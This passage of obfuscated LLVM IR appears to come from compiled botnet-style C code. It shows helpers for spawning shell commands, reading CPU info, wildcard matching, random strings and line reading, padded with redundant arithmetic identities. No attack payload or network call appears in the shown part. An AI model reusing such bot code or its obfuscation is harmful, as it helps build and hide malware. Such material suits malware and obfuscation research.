  store i32 -1, i32* %3, align 4
  br label %125

; <label>:38:                                     ; preds = %34
  %39 = load i32, i32* %8, align 4
  %40 = sext i32 %39 to i64
  %41 = mul i64 %40, 4
  %42 = trunc i64 %41 to i32
  %43 = zext i32 %42 to i64
  %44 = call noalias i8* @malloc(i64 %43) #2
  %45 = bitcast i8* %44 to i32*
  store i32* %45, i32** @fdopen_pids, align 8
  %46 = icmp eq i32* %45, null
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %38
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:48:                                     ; preds = %38
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = bitcast i32* %49 to i8*
  %51 = load i32, i32* %8, align 4
  %52 = sext i32 %51 to i64
  %53 = mul i64 %52, 4
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 %53, i32 1, i1 false)
  br label %54

; <label>:54:                                     ; preds = %48, %31
  %55 = call i32 @vfork() #11
  store i32 %55, i32* %9, align 4
  switch i32 %55, label %101 [
    i32 -1, label %56
    i32 0, label %63
  ]

; <label>:56:                                     ; preds = %54
  %57 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %58 = load i32, i32* %57, align 4
  %59 = call i32 @close(i32 %58)
  %60 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %61 = load i32, i32* %60, align 4
  %62 = call i32 @close(i32 %61)
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:63:                                     ; preds = %54
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 114
  br i1 %67, label %68, label %83

; <label>:68:                                     ; preds = %63
  %69 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = icmp ne i32 %70, 1
  br i1 %71, label %72, label %79

; <label>:72:                                     ; preds = %68
  %73 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %74 = load i32, i32* %73, align 4
  %75 = call i32 @dup2(i32 %74, i32 1) #2
  %76 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %77 = load i32, i32* %76, align 4
  %78 = call i32 @close(i32 %77)
  br label %79

; <label>:79:                                     ; preds = %72, %68
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %81 = load i32, i32* %80, align 4
  %82 = call i32 @close(i32 %81)
  br label %98

; <label>:83:                                     ; preds = %63
  %84 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %85 = load i32, i32* %84, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %94

; <label>:87:                                     ; preds = %83
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @dup2(i32 %89, i32 0) #2
  %91 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @close(i32 %92)
  br label %94

; <label>:94:                                     ; preds = %87, %83
  %95 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %96 = load i32, i32* %95, align 4
  %97 = call i32 @close(i32 %96)
  br label %98

; <label>:98:                                     ; preds = %94, %79
  %99 = load i8*, i8** %4, align 8
  %100 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.18, i32 0, i32 0), i8* %99, i8* null) #2
  call void @_exit(i32 127) #12
  unreachable

; <label>:101:                                    ; preds = %54
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 114
  br i1 %105, label %106, label %112

; <label>:106:                                    ; preds = %101
  %107 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %108 = load i32, i32* %107, align 4
  store i32 %108, i32* %6, align 4
  %109 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %110 = load i32, i32* %109, align 4
  %111 = call i32 @close(i32 %110)
  br label %118

; <label>:112:                                    ; preds = %101
  %113 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %114 = load i32, i32* %113, align 4
  store i32 %114, i32* %6, align 4
  %115 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %116 = load i32, i32* %115, align 4
  %117 = call i32 @close(i32 %116)
  br label %118

; <label>:118:                                    ; preds = %112, %106
  %119 = load i32, i32* %9, align 4
  %120 = load i32*, i32** @fdopen_pids, align 8
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i32, i32* %120, i64 %122
  store i32 %119, i32* %123, align 4
  %124 = load i32, i32* %6, align 4
  store i32 %124, i32* %3, align 4
  br label %125

; <label>:125:                                    ; preds = %118, %56, %47, %37, %30, %25
  %126 = load i32, i32* %3, align 4
  ret i32 %126
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  %11 = icmp eq i32* %10, null
  br i1 %11, label %19, label %12

; <label>:12:                                     ; preds = %1
  %13 = load i32*, i32** @fdopen_pids, align 8
  %14 = load i32, i32* %3, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i32, i32* %13, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %12, %1
  store i32 -1, i32* %2, align 4
  br label %65

; <label>:20:                                     ; preds = %12
  %21 = load i32, i32* %3, align 4
  %22 = call i32 @close(i32 %21)
  %23 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %24 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %25 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %27 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  br label %28

; <label>:28:                                     ; preds = %42, %20
  %29 = load i32*, i32** @fdopen_pids, align 8
  %30 = load i32, i32* %3, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i32, i32* %29, i64 %31
  %33 = load i32, i32* %32, align 4
  %34 = call i32 @waitpid(i32 %33, i32* %7, i32 0)
  store i32 %34, i32* %8, align 4
  br label %35

; <label>:35:                                     ; preds = %28
  %36 = load i32, i32* %8, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %42

; <label>:38:                                     ; preds = %35
  %39 = call i32* @__errno_location() #13
  %40 = load i32, i32* %39, align 4
  %41 = icmp eq i32 %40, 4
  br label %42

; <label>:42:                                     ; preds = %38, %35
  %43 = phi i1 [ false, %35 ], [ %41, %38 ]
  br i1 %43, label %28, label %44

; <label>:44:                                     ; preds = %42
  %45 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %46 = load i32*, i32** @fdopen_pids, align 8
  %47 = load i32, i32* %4, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds i32, i32* %46, i64 %48
  store i32 0, i32* %49, align 4
  %50 = load i32, i32* %8, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %44
  br label %63

; <label>:53:                                     ; preds = %44
  %54 = bitcast %struct.in_addr* %9 to i32*
  %55 = load i32, i32* %7, align 4
  store i32 %55, i32* %54, align 4
  %56 = bitcast %struct.in_addr* %9 to i32*
  %57 = load i32, i32* %56, align 4
  %58 = xor i32 65280, -1
  %59 = xor i32 %57, %58
  %60 = and i32 %59, %57
  %61 = and i32 %57, 65280
  %62 = ashr i32 %60, 8
  br label %63

; <label>:63:                                     ; preds = %53, %52
  %64 = phi i32 [ -1, %52 ], [ %62, %53 ]
  store i32 %64, i32* %2, align 4
  br label %65

; <label>:65:                                     ; preds = %63, %19
  %66 = load i32, i32* %2, align 4
  ret i32 %66
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %40

; <label>:27:                                     ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = sub i32 %35, -167544081
  %37 = add i32 %36, 1
  %38 = add i32 %37, -167544081
  %39 = add nsw i32 %35, 1
  store i32 %38, i32* %8, align 4
  br label %9

; <label>:40:                                     ; preds = %25
  %41 = load i32, i32* %7, align 4
  %42 = icmp eq i32 %41, 0
  br i1 %42, label %43, label %44

; <label>:43:                                     ; preds = %40
  br label %46

; <label>:44:                                     ; preds = %40
  %45 = load i8*, i8** %4, align 8
  br label %46

; <label>:46:                                     ; preds = %44, %43
  %47 = phi i8* [ null, %43 ], [ %45, %44 ]
  ret i8* %47
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

; <label>:4:                                      ; preds = %14, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

; <label>:9:                                      ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

; <label>:12:                                     ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  br i1 %13, label %14, label %39

; <label>:14:                                     ; preds = %12
  %15 = load i64, i64* %3, align 8
  %16 = shl i64 %15, 4
  %17 = load i8*, i8** %2, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %2, align 8
  %19 = load i8, i8* %17, align 1
  %20 = zext i8 %19 to i64
  %21 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %20
  %22 = load i64, i64* %21, align 8
  %23 = xor i64 %16, -1
  %24 = xor i64 %22, -1
  %25 = xor i64 6563789141888725289, -1
  %26 = and i64 %23, 6563789141888725289
  %27 = and i64 %16, %25
  %28 = and i64 %24, 6563789141888725289
  %29 = and i64 %22, %25
  %30 = or i64 %26, %27
  %31 = or i64 %28, %29
  %32 = xor i64 %30, %31
  %33 = or i64 %23, %24
  %34 = xor i64 %33, -1
  %35 = or i64 6563789141888725289, %25
  %36 = and i64 %34, %35
  %37 = or i64 %32, %36
  %38 = or i64 %16, %22
  store i64 %37, i64* %3, align 8
  br label %4

; <label>:39:                                     ; preds = %12
  %40 = load i64, i64* %3, align 8
  ret i64 %40
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %79 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %47
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %116

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %38

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %36

; <label>:24:                                     ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  %31 = and i1 true, %30
  %32 = xor i1 true, true
  %33 = and i1 %29, %32
  %34 = or i1 %31, %33
  %35 = xor i1 %29, true
  br label %36

; <label>:36:                                     ; preds = %24, %19
  %37 = phi i1 [ false, %19 ], [ %34, %24 ]
  br label %38

; <label>:38:                                     ; preds = %36, %13
  %39 = phi i1 [ true, %13 ], [ %37, %36 ]
  %40 = xor i1 %39, true
  %41 = and i1 true, %40
  %42 = xor i1 true, true
  %43 = and i1 %39, %42
  %44 = or i1 %41, %43
  %45 = xor i1 %39, true
  %46 = zext i1 %44 to i32
  store i32 %46, i32* %3, align 4
  br label %116

; <label>:47:                                     ; preds = %2
  %48 = load i8*, i8** %5, align 8
  %49 = load i8, i8* %48, align 1
  %50 = zext i8 %49 to i32
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %52, label %65

; <label>:52:                                     ; preds = %47
  %53 = load i8*, i8** %4, align 8
  %54 = getelementptr inbounds i8, i8* %53, i64 1
  %55 = load i8*, i8** %5, align 8
  %56 = getelementptr inbounds i8, i8* %55, i64 1
  %57 = call i32 @wildString(i8* %54, i8* %56)
  %58 = icmp ne i32 %57, 0
  %59 = xor i1 %58, true
  %60 = and i1 true, %59
  %61 = xor i1 true, true
  %62 = and i1 %58, %61
  %63 = or i1 %60, %62
  %64 = xor i1 %58, true
  br label %65

; <label>:65:                                     ; preds = %52, %47
  %66 = phi i1 [ false, %47 ], [ %63, %52 ]
  %67 = xor i1 %66, true
  %68 = and i1 false, %67
  %69 = xor i1 false, true
  %70 = and i1 %66, %69
  %71 = xor i1 true, true
  %72 = and i1 %71, false
  %73 = and i1 true, %69
  %74 = or i1 %68, %70
  %75 = or i1 %72, %73
  %76 = xor i1 %74, %75
  %77 = xor i1 %66, true
  %78 = zext i1 %76 to i32
  store i32 %78, i32* %3, align 4
  br label %116

; <label>:79:                                     ; preds = %2
  %80 = load i8*, i8** %4, align 8
  %81 = load i8, i8* %80, align 1
  %82 = zext i8 %81 to i32
  %83 = call i32 @toupper(i32 %82) #10
  %84 = load i8*, i8** %5, align 8
  %85 = load i8, i8* %84, align 1
  %86 = zext i8 %85 to i32
  %87 = call i32 @toupper(i32 %86) #10
  %88 = icmp eq i32 %83, %87
  br i1 %88, label %89, label %107

; <label>:89:                                     ; preds = %79
  %90 = load i8*, i8** %4, align 8
  %91 = getelementptr inbounds i8, i8* %90, i64 1
  %92 = load i8*, i8** %5, align 8
  %93 = getelementptr inbounds i8, i8* %92, i64 1
  %94 = call i32 @wildString(i8* %91, i8* %93)
  %95 = icmp ne i32 %94, 0
  %96 = xor i1 %95, true
  %97 = and i1 true, %96
  %98 = xor i1 true, true
  %99 = and i1 %95, %98
  %100 = xor i1 true, true
  %101 = and i1 %100, true
  %102 = and i1 true, %98
  %103 = or i1 %97, %99
  %104 = or i1 %101, %102
  %105 = xor i1 %103, %104
  %106 = xor i1 %95, true
  br label %107

; <label>:107:                                    ; preds = %89, %79
  %108 = phi i1 [ false, %79 ], [ %105, %89 ]
  %109 = xor i1 %108, true
  %110 = and i1 true, %109
  %111 = xor i1 true, true
  %112 = and i1 %108, %111
  %113 = or i1 %110, %112
  %114 = xor i1 %108, true
  %115 = zext i1 %113 to i32
  store i32 %115, i32* %3, align 4
  br label %116

; <label>:116:                                    ; preds = %107, %65, %38, %9
  %117 = load i32, i32* %3, align 4
  ret i32 %117
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %7, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  br i1 %6, label %7, label %16

; <label>:7:                                      ; preds = %3
  %8 = load i8*, i8** %2, align 8
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i32
  %11 = call i32 @toupper(i32 %10) #10
  %12 = trunc i32 %11 to i8
  %13 = load i8*, i8** %2, align 8
  store i8 %12, i8* %13, align 1
  %14 = load i8*, i8** %2, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %2, align 8
  br label %3

; <label>:16:                                     ; preds = %3
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.19, i32 0, i32 0), i32 0)
  store i32 %7, i32* %4, align 4
  br label %8

; <label>:8:                                      ; preds = %89, %1
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* %9, i32 4096, i32 %10)
  %12 = icmp ne i8* %11, null
  br i1 %12, label %13, label %91

; <label>:13:                                     ; preds = %8
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @uppercase(i8* %14)
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %16 = call i8* @strstr(i8* %15, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.20, i32 0, i32 0)) #10
  %17 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %18 = icmp eq i8* %16, %17
  br i1 %18, label %19, label %89

; <label>:19:                                     ; preds = %13
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %21 = getelementptr inbounds i8, i8* %20, i64 8
  store i8* %21, i8** %6, align 8
  br label %22

; <label>:22:                                     ; preds = %39, %19
  %23 = load i8*, i8** %6, align 8
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %25, 32
  br i1 %26, label %37, label %27

; <label>:27:                                     ; preds = %22
  %28 = load i8*, i8** %6, align 8
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i32
  %31 = icmp eq i32 %30, 9
  br i1 %31, label %37, label %32

; <label>:32:                                     ; preds = %27
  %33 = load i8*, i8** %6, align 8
  %34 = load i8, i8* %33, align 1
  %35 = zext i8 %34 to i32
  %36 = icmp eq i32 %35, 58
  br label %37

; <label>:37:                                     ; preds = %32, %27, %22
  %38 = phi i1 [ true, %27 ], [ true, %22 ], [ %36, %32 ]
  br i1 %38, label %39, label %42

; <label>:39:                                     ; preds = %37
  %40 = load i8*, i8** %6, align 8
  %41 = getelementptr inbounds i8, i8* %40, i32 1
  store i8* %41, i8** %6, align 8
  br label %22

; <label>:42:                                     ; preds = %37
  br label %43

; <label>:43:                                     ; preds = %68, %42
  %44 = load i8*, i8** %6, align 8
  %45 = load i8*, i8** %6, align 8
  %46 = call i64 @strlen(i8* %45) #10
  %47 = add i64 %46, -6431274744235565037
  %48 = sub i64 %47, 1
  %49 = sub i64 %48, -6431274744235565037
  %50 = sub i64 %46, 1
  %51 = getelementptr inbounds i8, i8* %44, i64 %49
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 13
  br i1 %54, label %66, label %55

; <label>:55:                                     ; preds = %43
  %56 = load i8*, i8** %6, align 8
  %57 = load i8*, i8** %6, align 8
  %58 = call i64 @strlen(i8* %57) #10
  %59 = sub i64 0, 1
  %60 = add i64 %58, %59
  %61 = sub i64 %58, 1
  %62 = getelementptr inbounds i8, i8* %56, i64 %60
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 10
  br label %66

; <label>:66:                                     ; preds = %55, %43
  %67 = phi i1 [ true, %43 ], [ %65, %55 ]
  br i1 %67, label %68, label %76

; <label>:68:                                     ; preds = %66
  %69 = load i8*, i8** %6, align 8
  %70 = load i8*, i8** %6, align 8
  %71 = call i64 @strlen(i8* %70) #10
  %72 = sub i64 0, 1
  %73 = add i64 %71, %72
  %74 = sub i64 %71, 1
  %75 = getelementptr inbounds i8, i8* %69, i64 %73
  store i8 0, i8* %75, align 1
  br label %43

; <label>:76:                                     ; preds = %66
  %77 = load i8*, i8** %6, align 8
  %78 = call i8* @strchr(i8* %77, i32 46) #10
  %79 = icmp ne i8* %78, null
  br i1 %79, label %80, label %83

; <label>:80:                                     ; preds = %76
  %81 = load i8*, i8** %6, align 8
  %82 = call i8* @strchr(i8* %81, i32 46) #10
  store i8 0, i8* %82, align 1
  br label %83

; <label>:83:                                     ; preds = %80, %76
  %84 = load i8*, i8** %3, align 8
  %85 = load i8*, i8** %6, align 8
  %86 = call i8* @strcpy(i8* %84, i8* %85) #2
  %87 = load i32, i32* %4, align 4
  %88 = call i32 @close(i32 %87)
  store i32 0, i32* %2, align 4
  br label %94

; <label>:89:                                     ; preds = %13
  %90 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %90, i8 0, i64 4096, i32 16, i1 false)
  br label %8

; <label>:91:                                     ; preds = %8
  %92 = load i32, i32* %4, align 4
  %93 = call i32 @close(i32 %92)
  store i32 1, i32* %2, align 4
  br label %94

; <label>:94:                                     ; preds = %91, %83
  %95 = load i32, i32* %2, align 4
  ret i32 %95
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.19, i32 0, i32 0), i32 0)
  store i32 %4, i32* %2, align 4
  br label %5

; <label>:5:                                      ; preds = %22, %0
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  br i1 %9, label %10, label %24

; <label>:10:                                     ; preds = %5
  %11 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %11)
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %13 = call i8* @strstr(i8* %12, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.20, i32 0, i32 0)) #10
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %15 = icmp eq i8* %13, %14
  br i1 %15, label %16, label %22

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* %1, align 4
  %18 = add i32 %17, 1382196124
  %19 = add i32 %18, 1
  %20 = sub i32 %19, 1382196124
  %21 = add nsw i32 %17, 1
  store i32 %20, i32* %1, align 4
  br label %22

; <label>:22:                                     ; preds = %16, %10
  %23 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %23, i8 0, i64 4096, i32 16, i1 false)
  br label %5

; <label>:24:                                     ; preds = %5
  %25 = load i32, i32* %2, align 4
  %26 = call i32 @close(i32 %25)
  %27 = load i32, i32* %1, align 4
  ret i32 %27
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %23, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %30

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = sub i32 0, %12
  %14 = sub i32 0, 65
  %15 = add i32 %13, %14
  %16 = sub i32 0, %15
  %17 = add i32 %12, 65
  %18 = trunc i32 %16 to i8
  %19 = load i8*, i8** %3, align 8
  %20 = load i32, i32* %5, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 %18, i8* %22, align 1
  br label %23

; <label>:23:                                     ; preds = %10
  %24 = load i32, i32* %5, align 4
  %25 = sub i32 0, %24
  %26 = sub i32 0, 1
  %27 = add i32 %25, %26
  %28 = sub i32 0, %27
  %29 = add nsw i32 %24, 1
  store i32 %28, i32* %5, align 4
  br label %6

; <label>:30:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
